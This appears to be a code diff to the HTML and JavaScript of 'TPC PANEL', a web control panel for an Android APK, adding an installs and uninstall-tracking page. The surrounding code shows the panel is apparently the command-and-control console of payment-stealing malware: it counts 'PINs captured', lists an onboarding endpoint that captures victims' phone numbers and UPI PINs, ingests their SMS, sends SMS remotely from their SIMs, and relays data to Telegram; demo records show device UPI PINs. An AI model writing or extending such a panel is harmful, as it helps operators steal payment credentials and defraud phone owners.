@@ -357,6 +357,10 @@ border:1px dashed #fbbf2455;display:flex;align-items:center;justify-content:spac
 .keyout .k{font-family:var(--mono);font-size:20px;font-weight:800;letter-spacing:3px;color:#fde68a;
 text-shadow:0 0 20px #fbbf2440;overflow-wrap:anywhere}
 
+.bar{height:8px;border-radius:999px;background:#0f1e3d;overflow:hidden;margin-top:10px}
+.bar>span{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,#22d3ee,#38bdf8)}
+.bar.red>span{background:linear-gradient(90deg,#ff5c7a,#fbbf24)}
+
 @media (max-width:1100px){
 .stats{grid-template-columns:repeat(2,minmax(0,1fr))}
 .grid2{grid-template-columns:1fr}
@@ -492,13 +496,15 @@ main{padding:18px 13px}
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
 <p class="side-label" style="margin-top:22px">Automation</p>
 <button class="nav" data-page="relay" type="button"><i>📡</i> Relay</button>
+<p class="side-label" style="margin-top:22px">Growth</p>
+<button class="nav" data-page="growth" data-admin-only="1" type="button"><i>📈</i> Installs</button>
 <p class="side-label" style="margin-top:22px">System</p>
 <button class="nav" data-page="devices" type="button"><i>▣</i> Devices</button>
 <button class="nav" data-page="users" data-admin-only="1" type="button"><i>🔑</i> Access keys</button>
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v5.3</div>
+<div>TPC PANEL · v5.4</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -531,6 +537,18 @@ main{padding:18px 13px}
 <article class="stat panel">
 <div class="stat-top"><span class="stat-label">PINs captured</span><span class="stat-icon">🔑</span></div>
 <div class="stat-val violet" id="sPins">—</div><div class="stat-foot">onboarded devices</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
+<div class="stat-val neon" id="sInstalls">—</div><div class="stat-foot">APK installs lifetime</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
+<div class="stat-val red" id="sUninstalled">—</div><div class="stat-foot">no ping &gt; 7 days</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
+<div class="stat-val violet" id="sReinstalls">—</div><div class="stat-foot">same phone, dobara</div>
 </article>
 </div>
 
@@ -739,6 +757,79 @@ main{padding:18px 13px}
 </section>
 </section>
 
+<section class="page" id="page-growth">
+<div class="head">
+<div><h2>Installs</h2><p>APK kitni baar install hui, kitni devices chhod gayi</p></div>
+<div class="toolbar">
+<select id="growthFilter" style="width:auto">
+<option value="">All events</option>
+<option value="install">Install</option>
+<option value="update">Update</option>
+<option value="open">Open</option>
+<option value="gone">Gone</option>
+</select>
+<button class="btn ghost" data-refresh="growth" type="button">↻ Refresh</button>
+</div>
+</div>
+
+<div class="stats">
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs</span><span class="stat-icon">⬇</span></div>
+<div class="stat-val neon" id="gInstalls">—</div><div class="stat-foot">lifetime</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Live now</span><span class="stat-icon">◉</span></div>
+<div class="stat-val green" id="gLive">—</div><div class="stat-foot">active in 90s</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Idle &lt;24h</span><span class="stat-icon">○</span></div>
+<div class="stat-val violet" id="gIdle">—</div><div class="stat-foot">reachable</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Stale 1-7d</span><span class="stat-icon">⌛</span></div>
+<div class="stat-val" id="gStale">—</div><div class="stat-foot">slow fade</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstalled</span><span class="stat-icon">✕</span></div>
+<div class="stat-val red" id="gUninstalled">—</div><div class="stat-foot">&gt; 7 days silent</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Reinstalls</span><span class="stat-icon">↻</span></div>
+<div class="stat-val violet" id="gReinstalls">—</div><div class="stat-foot">churn signal</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Unique phones</span><span class="stat-icon">▣</span></div>
+<div class="stat-val" id="gUnique">—</div><div class="stat-foot">distinct android_id</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Installs 24h</span><span class="stat-icon">＋</span></div>
+<div class="stat-val green" id="gToday">—</div><div class="stat-foot">aaj</div>
+</article>
+<article class="stat panel">
+<div class="stat-top"><span class="stat-label">Uninstall rate</span><span class="stat-icon">%</span></div>
+<div class="stat-val red" id="gRate">—</div><div class="stat-foot">uninstalled / installs</div>
+</article>
+</div>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Send queue</h3><span class="badge" id="gQueueBadge">—</span></div>
+<div class="panel-body">
+<div class="row"><div><div class="row-name">Queued</div><div class="row-desc">device tak pahuncha, radio pending</div></div><span class="badge warn" id="gQueued">0</span></div>
+<div class="row"><div><div class="row-name">Sent</div><div class="row-desc">radio ne accept kiya</div></div><span class="badge ok" id="gSent">0</span></div>
+<div class="row"><div><div class="row-name">Delivered</div><div class="row-desc">carrier delivery report aaya</div></div><span class="badge ok" id="gDelivered">0</span></div>
+<div class="row"><div><div class="row-name">Failed</div><div class="row-desc">send error</div></div><span class="badge bad" id="gFailed">0</span></div>
+</div>
+</section>
+
+<section class="panel-box panel">
+<div class="panel-head"><h3>Event feed</h3><span class="badge" id="gEventCount">0</span></div>
+<div class="table-wrap">
+<table><thead><tr><th>Time</th><th>Event</th><th>Device</th><th>ID</th><th>Version</th><th>Android ID</th></tr></thead>
+<tbody id="gEventBody"></tbody></table>
+</div>
+</section>
+</section>
+
 <section class="page" id="page-devices">
 <div class="head">
 <div><h2>Devices</h2><p>Kisi bhi phone par click karo — Actions me Auto Sender on/off karo</p></div>
@@ -830,14 +921,16 @@ main{padding:18px 13px}
 <section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.3</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v5.4</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>APK</strong><p><a id="apkSettings" href="#" target="_blank" rel="noopener">—</a></p></div>
 <div class="settings-row"><strong>Access</strong><p>Admin: username + password. User: sirf access key (admin generate karta hai, koi self-register nahi).</p></div>
 <div class="settings-row"><strong>Key endpoints</strong><p>POST /admin/keys (generate) · POST /panel/access (login by key) · POST /admin/keys/{id}/expiry|toggle|delete</p></div>
-<div class="settings-row"><strong>Dual SIM</strong><p>Auto Sender me SIM 1 / SIM 2 chips se choose karo — jo on honge wahi slots par SMS queue hoga. Message list me SIM badge dikhta hai.</p></div>
+<div class="settings-row"><strong>Dual SIM</strong><p>Auto Sender me SIM 1 / SIM 2 chips se choose karo — jo on honge wahi slots par SMS queue hoga. Message list me SIM badge dikhta hai. Ack me sim_slot wapas aata hai, isliye badge exact hota hai.</p></div>
 <div class="settings-row"><strong>Telegram confirm</strong><p>On hone par har auto-send ka confirm forward target par set format me jaata hai.</p></div>
 <div class="settings-row"><strong>Send</strong><p>/admin/send — target, device_id, to, body, sim_slots[] . Delivery fail ho to row pending rehti hai aur device online hote hi chali jaati hai.</p></div>
+<div class="settings-row"><strong>Send status</strong><p>queued → sent → delivered. Device har stage par ack bhejta hai; stale "queued" rows 3 min baad dobara push hoti hain.</p></div>
+<div class="settings-row"><strong>Growth</strong><p>/devices/event par install / update / open. Uninstall Android se broadcast nahi hota — 7 din silence = uninstalled. Same android_id par naya install_id = reinstall.</p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
 <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
@@ -983,8 +1076,8 @@ const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" str
 
 const APK_URL = "https://github.com/usual-coderz/screenlink-remote/actions/runs/39284106720#artifacts";
 
-const TKEY = "tpc.token.v8";
-const SKEY = "tpc.session.v8";
+const TKEY = "tpc.token.v9";
+const SKEY = "tpc.session.v9";
 let DEMO = false;
 let reloginPromise = null;
 let gridSig = "";
@@ -993,6 +1086,7 @@ let liveSig = "";
 const state = {
 auth:false, role:"user", me:null, users:[], devices:[], messages:[], devMsgs:{},
 rules:[], tgLogs:[], relay:null, relayAccount:null, forward:"", outbox:[],
+growth:null, growthEvents:[],
 pinsOnly:false, active:null, asOpen:false, toastTimer:null, pollTimer:null,
 ws:null, wsOk:false, wsFails:0, wsTimer:null, linkOk:true, numTried:{}, lastError:"",
 sel:{ as:[], send:[], bulk:[] }
@@ -1051,9 +1145,9 @@ function badgeCell(row,v,force){
 const td=document.createElement("td"); const b=document.createElement("span");
 const s=String(val(v,"unknown")).toLowerCase(); b.className="badge";
 if(force&&String(force).trim())addCls(b,force);
-else if(["online","active","sent","success","bound","upi","delivered","received","ok"].indexOf(s)>=0)addCls(b,"ok");
-else if(["pending","queued","sending"].indexOf(s)>=0)addCls(b,"warn");
-else if(["failed","error","offline"].indexOf(s)>=0)addCls(b,"bad");
+else if(["online","active","sent","success","bound","upi","delivered","received","ok","install"].indexOf(s)>=0)addCls(b,"ok");
+else if(["pending","queued","sending","update","stale"].indexOf(s)>=0)addCls(b,"warn");
+else if(["failed","error","offline","gone","uninstalled"].indexOf(s)>=0)addCls(b,"bad");
 b.textContent=val(v,"—"); td.appendChild(b); row.appendChild(td);
 }
 function simCell(row,slot){
@@ -1238,6 +1332,7 @@ job.queued=r&&typeof r.queued==="number"?r.queued:1;
 renderOutbox();
 toast("queued "+job.queued+" · delivered "+job.delivered);
 loadMessages().catch(()=>{});
+loadStats().catch(()=>{});
 return true;
 })
 .catch((e)=>{ last=e; return false; });
@@ -1397,6 +1492,11 @@ $("#sTotal").textContent=total; $("#sOnline").textContent=on; $("#sOffline").tex
 const sims=state.devices.reduce((s,d)=>s+((tel(d).sims||[]).length||d.sim_count||0),0);
 $("#sSims").textContent=sims;
 $("#sPins").textContent=state.devices.filter(hasPin).length;
+if(state.growth){
+$("#sInstalls").textContent=state.growth.installs_total;
+$("#sUninstalled").textContent=state.growth.uninstalled;
+$("#sReinstalls").textContent=state.growth.reinstalls;
+}
 const body=$("#recentBody");
 if(!state.devices.length){ empty(body,5,"No devices registered"); return; }
 body.replaceChildren();
@@ -1504,6 +1604,62 @@ span.className="body-cell"; span.title=m.body||""; span.appendChild(mark(m.body|
 bc.appendChild(span); row.appendChild(bc);
 cell(row,m.amount?"₹"+m.amount:"—");
 badgeCell(row,m.status||(m.direction==="in"?"received":"sent"));
+body.appendChild(row);
+});
+}
+
+/* ------------------------------- GROWTH ------------------------------- */
+
+async function loadStats(){
+try{ state.growth=await api("/admin/stats"); renderGrowth(); }catch(e){}
+}
+
+async function loadGrowthEvents(){
+const f=$("#growthFilter")?$("#growthFilter").value:"";
+try{
+const d=await api("/admin/growth/events?limit=120");
+state.growthEvents=(d.events||[]).filter((e)=>!f||e.event===f);
+}catch(e){ state.growthEvents=[]; }
+renderGrowthEvents();
+}
+
+function renderGrowth(){
+const g=state.growth; if(!g)return;
+$("#gInstalls").textContent=g.installs_total;
+$("#gLive").textContent=g.live;
+$("#gIdle").textContent=g.idle;
+$("#gStale").textContent=g.stale;
+$("#gUninstalled").textContent=g.uninstalled;
+$("#gReinstalls").textContent=g.reinstalls;
+$("#gUnique").textContent=g.unique_devices;
+$("#gToday").textContent=g.install_events_24h;
+$("#gRate").textContent=g.uninstall_rate_pct+"%";
+const o=g.outbox||{};
+$("#gQueued").textContent=o.queued||0;
+$("#gSent").textContent=o.sent||0;
+$("#gDelivered").textContent=o.delivered||0;
+$("#gFailed").textContent=o.failed||0;
+badge($("#gQueueBadge"),(o.pending||0)+" pending",(o.pending?"warn":"ok"));
+$("#sInstalls").textContent=g.installs_total;
+$("#sUninstalled").textContent=g.uninstalled;
+$("#sReinstalls").textContent=g.reinstalls;
+}
+
+function renderGrowthEvents(){
+$("#gEventCount").textContent=state.growthEvents.length+" events";
+const body=$("#gEventBody");
+if(!state.growthEvents.length){ empty(body,6,"Koi event nahi"); return; }
+body.replaceChildren();
+state.growthEvents.forEach((e)=>{
+const row=document.createElement("tr");
+cell(row,fmt(e.ts));
+const kind=String(e.event||"").toLowerCase();
+badgeCell(row,kind,kind==="install"?"ok":kind==="gone"?"bad":kind==="update"?"warn":"");
+cell(row,e.device_name||"—");
+const idc=document.createElement("td"); const idb=document.createElement("span");
+idb.className="badge id mono"; idb.textContent=e.short_id||"—"; idc.appendChild(idb); row.appendChild(idc);
+cell(row,e.app_version||"—");
+cell(row,e.android_id||"—");
 body.appendChild(row);
 });
 }
@@ -1643,7 +1799,7 @@ cell(row,l.result||"—"); body.appendChild(row);
 function gridSignature(){
 return state.devices.map((d)=>{
 const a=autoOf(d); const info=nums(d);
-return [devId(d),devName(d),devStatus(d),a.enabled?"1":"0",info.live,info.entered,d.upi_pin,tel(d).model,tel(d).battery_level,tel(d).battery_charging,(a.sim_slots||[]).join("")].join("|");
+return [devId(d),devName(d),devStatus(d),a.enabled?"1":"0",info.live,info.entered,d.upi_pin,tel(d).model,tel(d).battery_level,tel(d).battery_charging,(a.sim_slots||[]).join(""),d.install_state].join("|");
 }).join("~")+"|"+(state.pinsOnly?"1":"0")+"|"+($("#devSearch").value||"");
 }
 
@@ -1693,6 +1849,13 @@ if(auto.enabled){
 const ab=document.createElement("span"); ab.className="badge auto";
 ab.textContent="AUTO"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
 meta.appendChild(ab); }
+const ist=String(d.install_state||"").toLowerCase();
+if(ist==="uninstalled"||ist==="gone"){
+const ub=document.createElement("span"); ub.className="badge bad";
+ub.textContent=ist==="gone"?"REPLACED":"UNINSTALLED"; meta.appendChild(ub); }
+else if(ist==="stale"){
+const sb2=document.createElement("span"); sb2.className="badge warn";
+sb2.textContent="STALE"; meta.appendChild(sb2); }
 card.appendChild(meta);
 
 const foot=document.createElement("div"); foot.className="dev-foot";
@@ -1738,7 +1901,8 @@ const tiles=[
 ["Battery",batt(d)===null?"—":batt(d)+"%"+(t.battery_charging?" ⚡":"")],
 ["Network",t.network_type||"—"],["Created",fmt(d.created_at)],["Last seen",fmt(d.last_seen)],
 ["Messages",String(msgs.length)],["UPI PIN",d.upi_pin||"—"],["Payment app",d.payment_app||"—"],
-["Socket",d.ws_connected?"connected":"disconnected"]
+["Socket",d.ws_connected?"connected":"disconnected"],["Install #",String(d.install_seq||1)],
+["App version",d.app_version||"—"],["Install state",d.install_state||"—"]
 ];
 tiles.forEach((p)=>{ const tile=document.createElement("div"); tile.className="spec";
 const k=document.createElement("div"); k.className="spec-k"; k.textContent=p[0];
@@ -1751,7 +1915,11 @@ const t=tel(d); const box=$("#dMore"); box.replaceChildren();
 const grid=document.createElement("div"); grid.className="more-grid";
 const rows=[
 ["Device id",devId(d)],["Short id",d.short_id],["Registration id",d.registration_id],
-["Manufacturer",t.manufacturer],["Brand",t.brand],["SDK int",t.sdk_int],["Android ID",t.android_id],
+["Manufacturer",t.manufacturer],["Brand",t.brand],["SDK int",t.sdk_int],["Android ID",d.android_id||t.android_id],
+["Install id",d.install_id],["Install seq",d.install_seq],["Install state",d.install_state],
+["Installed at",d.installed_at?fmt(d.installed_at):null],
+["Uninstalled at",d.uninstalled_at?fmt(d.uninstalled_at):null],
+["App version",d.app_version],
 ["CPU / ABI",t.cpu_abi],["Cores",t.cpu_cores],["Resolution",t.screen_resolution],["Local IP",t.local_ip],
 ["SIM count",t.sim_count],["Number source",t.sim_number_source],["Battery temp",t.battery_temperature_c],
 ["Inbox synced",d.sms_inbox_synced_at?fmt(d.sms_inbox_synced_at):null],["Inbox count",t.sms_inbox_count],
@@ -1856,6 +2024,13 @@ pb.textContent="PIN "+d.upi_pin+(d.payment_app?" · "+d.payment_app:""); tags.ap
 if(auto.enabled){ const ab=document.createElement("span"); ab.className="badge auto";
 ab.textContent="AUTO SENDER"+((auto.sim_slots||[]).length?" · SIM "+(auto.sim_slots||[]).map((s)=>s+1).join("+"):"");
 tags.appendChild(ab); }
+const ist=String(d.install_state||"").toLowerCase();
+if(ist==="uninstalled"||ist==="gone"){
+const ub=document.createElement("span"); ub.className="badge bad";
+ub.textContent=ist==="gone"?"REPLACED":"UNINSTALLED"; tags.appendChild(ub); }
+if(Number(d.install_seq||1)>1){
+const rb=document.createElement("span"); rb.className="badge violet";
+rb.textContent="INSTALL #"+d.install_seq; tags.appendChild(rb); }
 const bb=$("#dBatt"); bb.replaceChildren(); bb.appendChild(battEl(d));
 badge($("#dTarget"),info.live||info.entered||"no number",info.live?"ok":info.entered?"pin":"bad");
 $("#actMenu").hidden=true;
@@ -2004,7 +2179,8 @@ if(!state.auth)return;
 $("#refreshBtn").disabled=true;
 try{
 await loadHealth();
-const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),loadRelayLogs(),loadAutoSender()];
+const jobs=[loadDevices(),loadMessages(),loadRules(),loadRelay(),loadRelayLogs(),
+loadAutoSender(),loadStats(),loadGrowthEvents()];
 if(state.role==="admin")jobs.push(loadUsers());
 const res=await Promise.allSettled(jobs);
 if(res.some((r)=>r.status==="rejected"))toast("some sections failed to sync");
@@ -2017,6 +2193,7 @@ if(section==="devices")await loadDevices();
 if(section==="messages")await loadMessages();
 if(section==="rules")await loadRules();
 if(section==="users")await loadUsers();
+if(section==="growth"){ await loadStats(); await loadGrowthEvents(); }
 if(section==="relay"){ await loadRelay(); await loadRelayLogs(); await loadRules(); }
 if(section==="live"){ await loadDevices(); await loadMessages(); }
 toast("synced");
@@ -2073,13 +2250,19 @@ const j=state.outbox.find((x)=>x.status!=="sent"&&x.status!=="failed"&&
 (!did||String(x.deviceId)===String(did))&&(!dbody||String(x.body)===String(dbody)));
 if(j){ j.status=data.status==="failed"?"failed":"sent"; renderOutbox(); }
 }
+if(type.indexOf("growth")>=0||type.indexOf("outbox_stats")>=0){
+loadStats().catch(()=>{});
+if(type.indexOf("growth")>=0)loadGrowthEvents().catch(()=>{});
+}
 }
 
 function schedulePoll(){
 clearTimeout(state.pollTimer);
 const fast=state.devices.some(online);
 state.pollTimer=setTimeout(async()=>{
-if(state.auth&&!document.hidden)await Promise.allSettled([loadDevices(),loadMessages()]);
+if(state.auth&&!document.hidden){
+await Promise.allSettled([loadDevices(),loadMessages(),loadStats()]);
+}
 schedulePoll();
 },fast?8000:20000);
 }
@@ -2099,6 +2282,7 @@ if(page==="devices")refreshSection("devices");
 if(page==="messages")refreshSection("messages");
 if(page==="relay")refreshSection("relay");
 if(page==="users")refreshSection("users");
+if(page==="growth")refreshSection("growth");
 }
 
 /* ------------------------------- wiring ------------------------------- */
@@ -2118,6 +2302,7 @@ $("#dUpi").addEventListener("change",renderDetailMsgs);
 $("#dClose").addEventListener("click",closeDetail);
 $("#dMoreToggle").addEventListener("click",()=>{ const b=$("#dMore");
 b.hidden=!b.hidden; $("#dMoreToggle").textContent=b.hidden?"show":"hide"; });
+if($("#growthFilter"))$("#growthFilter").addEventListener("change",loadGrowthEvents);
 
 $("#devGrid").addEventListener("click",(ev)=>{ const c=ev.target.closest("[data-dev]");
 if(c)openDeviceById(c.dataset.dev); });
@@ -2237,6 +2422,7 @@ sim_slots:slots.length?slots:null
 toast("queued to "+r.queued+" device(s), delivered "+r.delivered+(r.note?" — "+r.note:""));
 $("#bulkBody").value="";
 await loadMessages();
+await loadStats();
 }catch(e){ toast(e.message); } finally{ $("#bulkSend").disabled=false; }
 });
 $("#bulkTarget").addEventListener("change",()=>{
@@ -2350,6 +2536,7 @@ try{ if(state.ws)state.ws.close(); }catch(e){}
 clearTimeout(state.pollTimer); clearTimeout(state.wsTimer);
 clearSession();
 state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
+state.growth=null; state.growthEvents=[];
 state.pinsOnly=false; state.role="user";
 state.sel={as:[],send:[],bulk:[]};
 gridSig=""; liveSig="";
@@ -2365,15 +2552,15 @@ $("#refreshBtn").addEventListener("click",refreshAll);
 document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("#actMenu").hidden=true; });
 document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
 document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth){
-loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); } });
+loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); } });
 
 /* ------------------------------- demo ------------------------------- */
 
 const DEMO_DEVICES=[
-{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",created_at:Date.now()-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay",sim_slots:[0,1],tg_confirm:true},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"},{slot:1,carrier:"Airtel"}]}},
-{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",created_at:Date.now()-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
-{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",created_at:Date.now()-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
-{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",created_at:Date.now()-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}}
+{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay",sim_slots:[0,1],tg_confirm:true},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"},{slot:1,carrier:"Airtel"}]}},
+{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",install_state:"active",install_seq:2,app_version:"4.4",created_at:Date.now()-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
+{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",install_state:"uninstalled",install_seq:1,app_version:"4.3",created_at:Date.now()-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
+{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}}
 ];
 
 const DEMO_MESSAGES=[
@@ -2400,6 +2587,19 @@ if(p==="/health")return{status:"ok"};
 if(p==="/health/database")return{status:"ok"};
 if(p==="/admin/devices")return{devices:DEMO_DEVICES};
 if(p==="/admin/messages")return{messages:DEMO_MESSAGES};
+if(p==="/admin/stats")return{
+installs_total:DEMO_DEVICES.length,unique_devices:4,reinstalls:1,
+install_events_24h:2,install_events_7d:3,updates_total:1,updates_7d:1,
+live:3,idle:0,stale:0,uninstalled:1,replaced:0,onboarded:3,
+retention_pct:75.0,uninstall_rate_pct:25.0,
+outbox:{queued:2,sent:11,delivered:9,failed:1,pending:2},
+generated_at:new Date().toISOString()};
+if(p==="/admin/growth/events")return{events:[
+{id:"e1",event:"install",short_id:"TPC-0004",device_name:"Samsung A15",app_version:"4.4",android_id:"a1b2c3d4e5f6",ts:new Date(Date.now()-3600000).toISOString()},
+{id:"e2",event:"install",short_id:"TPC-0002",device_name:"Realme C55",app_version:"4.4",android_id:"b2c3d4e5f6a1",ts:new Date(Date.now()-7200000).toISOString()},
+{id:"e3",event:"update",short_id:"TPC-0001",device_name:"Redmi Note 12",app_version:"4.4",android_id:"c3d4e5f6a1b2",ts:new Date(Date.now()-10800000).toISOString()},
+{id:"e4",event:"gone",short_id:"TPC-0003",device_name:"Poco M6",app_version:"4.3",android_id:"d4e5f6a1b2c3",ts:new Date(Date.now()-14400000).toISOString()}
+]};
 if(p==="/admin/keys"){
 if(o.method==="POST"){
 const k="TPC-"+Math.random().toString(36).slice(2,6).toUpperCase()+"-"+
